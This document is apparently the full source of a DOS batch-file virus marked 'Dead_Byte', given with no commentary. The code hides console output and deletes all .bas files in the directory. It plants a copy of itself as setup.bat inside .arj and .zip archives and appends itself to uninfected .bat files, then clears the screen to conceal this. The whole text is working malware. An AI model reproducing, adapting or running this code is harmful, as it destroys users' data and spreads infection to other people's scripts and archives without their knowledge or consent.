  ctty nul                                               rem Dead_Byte
  if "%1"=="Dead_Byte" goto inf>nul
        del *.bas|REM Dead_Byte
        find "Dead_B" %0>Dead_B.bat
        ren Dead_B.bat setup.bat   
        for %%a in (*.arj) do arj a -y  %%a setup.bat    rem Dead_Byte
        for %%z in (*.zip) do pkzip  %%z setup.bat       rem Dead_Byte
        ren setup.bat Dead_B.bat                                    
  for %%f in (*.bat) do call %0 Dead_Byte %%f>nul
  goto end>nul                                           rem Dead_Byte
:inf                                                     rem Dead_Byte
  find "Dead_B" %0>Dead_B.vir                      
  find /v "Dead_B" %2
  if not errorlevel 1 goto end                           rem Dead_Byte
  copy %2+Dead_B.vir /b >nul                    
  del Dead_B.vir
:end                                                     rem Dead_Byte
  del Dead_B.vir
  del Dead_B.bat
  cls                                                    rem Dead_Byte



